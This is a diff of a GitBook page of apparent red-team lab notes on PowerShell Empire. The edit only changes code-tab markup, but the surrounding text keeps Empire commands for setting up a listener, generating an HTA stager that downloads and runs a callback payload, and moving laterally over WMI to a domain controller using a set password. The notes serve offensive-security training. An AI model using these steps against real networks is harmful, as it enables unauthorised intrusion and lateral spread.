@@ -6,16 +6,16 @@ description: Exploring key concepts of the Powershell Empire
 
 ## Listener
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 // Empire commands used
 ?
 uselistener meterpreter
 info
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/empire-listener.png)
 
@@ -31,8 +31,8 @@ execute
 
 Stager will download and execute the final payload which will call back to the listener we set up previously - `meterpreter`- below shows how to set it up:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 //specify what stager to use
 usestager windows/hta
@@ -46,8 +46,8 @@ set OutFile stage.hta
 //create the stager
 execute
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/empire-stager%20%281%29.png)
 
@@ -85,8 +85,8 @@ Continuing testing with the `http` listener and a `multi/launcher` stager, the a
 
 Let's try getting one more agent back from another machine via [WMI lateral movement](../lateral-movement/t1047-wmi-for-lateral-movement.md):
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 interact <agent-name>
 usemodule powershell/lateral_movement/invoke_wmi
@@ -96,8 +96,8 @@ set Password 123456
 set ComputerName dc-mantvydas
 run
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/empire-lateral-wmi.gif)
 
